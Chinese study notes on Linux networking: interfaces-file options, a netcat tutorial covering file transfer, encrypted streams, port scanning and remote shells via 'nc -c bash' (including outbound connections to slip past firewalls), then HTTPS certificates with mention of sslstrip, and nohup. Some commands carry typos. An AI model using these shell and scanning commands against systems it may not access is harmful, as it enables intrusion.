auto
语法：
auto <interface_name>
含义：
在系统启动的时候启动网络接口,无论网络接口有无连接(插入网线),如果该接口配置了DHCP,则无论有无网线,系统都会去执行DHCP,如果没有插入网线,则等该接口超时后才会继续。

allow hotplug
语法:
allow hotplug <interface_name>
含义：
只有当内核从该接口检测到热插拔事件后才启动该接口。如果系统开机时该接口没有插入网线,则系统不会启动该接口,系统启动后,如果插入网线,系统会自动启动该接口。也就是将网络接口设置为热插拔模式。

inet后面是跟连接网络方式static、loopback、dhcp

	17.NETCAT(NC):
windows telnet的linux升级版（控制面板-》程序和功能-》打开和关闭Windows 功能），默认是都关闭的。
不建议让nc参与域名的解释，据说有时候会很慢，后面直接跟ip。
这个命令可以作为客户端使用或者服务器端来支持
客户端命令：nc -nv n是指后面跟ip且不做DNS解析，-v是verbose（当做显示详细信息）
服务器端命令：nc -l -p 端口号 -l侦听 -p指定端口号
另外一个直接用nc -nv连接这个端口就可以聊天了，借助tcp连接
ls -l | nc -nv ip port #取证就尽可能保护本地的证据不会被破坏
服务器的命令后面可以加一个重定向：nc -l -p 33 > info.txt

root@kali:~# nc -nv 182.254.217.40 62
(UNKNOWN) [182.254.217.40] 62 (?) open
SSH-2.0-OpenSSH_6.6.1


nc的传输是流传输，所以可以传任何东西（“单个”文件或者进程返回的“一个”输出结果）
传输文件：
服务器传给客户端或者哭护短传给服务器
nc -lp 333 > 1.mp4
nc -nv IP Port < 1.mp4 -q 1 #不会自己退出
或者（下面这个就比较神奇，监听并且等待传输）
nc -lp 333 < 1.mp4 -q 1
nc -nv IP Port > 1.mp4

传输目录（之后都以一个方向举例）：目录只是个树杈在磁盘上的存储不同于文件的存储的原因么
A:tar -cvf - 目录名字| nc -lp 333 -q 1 #不具备传输目录结构的特性#tar的-表示把生成结果作为输出
B:nc -nv IP Port | tart -xvf - #-把得到结果作为tar解压目标。


加密传输：（对流加密就好，可以查看apt-cache search crypt）
A:nc -lp 333 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb > 1.mp4
B:mctypt --flush -Fbq -a rijndael-256 -m ecb < a.mlp4 | nc -nv IP Port -q 1
加密算法是rijndael，256长度版本。加密方法是ecb。解密完成，密钥会被flash掉，不会在本地保存，执行命令的时候输入。
服务器传数据给客户端

流媒体传输：（不会自动在本地保存）
A:cat 1.mp4 | nc -lp 333 -p 1 #虽然是cat过去，但是还是可以用>进行保存
B:nc -nv IP Port | mplayer -vo x1 -cache 3000 #播放器3000KB的缓存
h.264流也是可以直接被mplayer识别的

端口扫描：
-z探测窗口但是Zero IO（应该是指中间过程IO）
nc -nvz IP PortScope #一般开放的tcp端口会给出响应 #如果没有nv的话就没有输出回馈
nc -nvzu IP PortScope 这个很不准，居然一直说是开着的，不管什么端口

远程控制：
-q seconds 一般使用是-q 1。quit after EOF on stdin and delay of secs
在一般的nc连接命令后面加一个-c bash或者-c cmd即可。可以是服务器开放bash，或者客户端开放。exit后退出传递的bash，双方断开连接。
但是防火墙不会打开陌生端口映射给服务器，让外面的人连接。或者有可能，会在边界的时候，除了管理员开放的端口，会将其他端口的从外向内流量禁止掉，所以就要让他自己连出来，连出来的端口可能也被限制了，所以最好用管理员的开放端口。所以安全做得好的，就会把业务服务器的除了必须的，其他全部交给其他服务器，从而达到从内向外的安全。
使用wireshark follow tcp stream就可以知道具体操作，交出shell的一方在终端中是看不到另外一方干了什么的

	86.访问https网站，服务器收到访问请求后第一次响应是证书和证书的签名信息（颁发机构）。非对称加密-》对称加密/解密，以及hash。一开始服务器给的证书包含中公钥，客户端生成随机数用公钥加密发过去。经过优化，https速度已经和明文的http相差无几。本机有证书颁发机构的公钥，证书颁发机构给证书的时候会给hash值，同时用根证书的私钥进行加密。所以如果能够自己进行证书模仿，添加上自己的公钥，作为中间人颁布能让客户端信任的证书，那么就可以。。。。
不过有种叫sslstrip的技术，不是针对https本身的，而是通过修改路由信息，把https请求改为http链接,还有伪造类似锁的标记来欺骗用户。（类似钓鱼）现在很多攻击不是针对协议本身，而是针对没有安全常识或者安全常识不足的用户。

	   在密码学和计算机安全领域中，根书是未被签名的公钥证书或自签名的证书。基本义根证书是CA认证中心给自己颁发的证书,是信任链的起始点。
	   本机用公钥解密，然后对证书公钥计算也是对的，就会与目标网站进行交互。否则，证书造假被浏览器拦截。或者自己制造自签名证书，给本机下载信任（比如说vega），vega的签名机构的证书也是有的需要下载。。
	   vega与目标https是使用证书颁发机构的证书。
	   证书给百度，限定域名是*.baidu.com
	   证书颁发机构分级别，层级化管理，下一级颁发机构的根证书需要上一级的证书颁发机构进行签名。
	   VerSign是去全球最大的证书颁发机构。

	120.nohup Command [ Arg ... ] [　& ] 　　
描述：nohup 命令运行由 Command 参数和任何相关的 Arg 参数指定的命令，忽略所有挂断（SIGHUP）信号。在注销后使用 nohup 命令运行后台中的程序。要运行后台中的 nohup 命令，添加 & （ 表示“and”的符号）到命令的尾部。 　　
如果不将 nohup 命令的输出重定向，输出将附加到当前目录的 nohup.out 文件中。如果当前目录的 nohup.out 文件不可写，输出重定向到 $HOME/nohup.out 文件中。如果没有文件能创建或打开以用于追加，那么 Command 参数指定的命令不可调用。如果标准错误是一个终端，那么把指定的命令写给标准错误的所有输出作为标准输出重定向到相同的文件描述符。 

Unix/Linux下一般比如想让某个程序在后台运行，很多都是使用 & 在程序结尾来让程序自动运行。比如我们要运行mysql在后台：
/usr/local/mysql/bin/mysqld_safe --user=mysql &但是加入我们很多程序并不象mysqld一样做成守护进程，那么就使用nohup：
nohup /root/test.php &
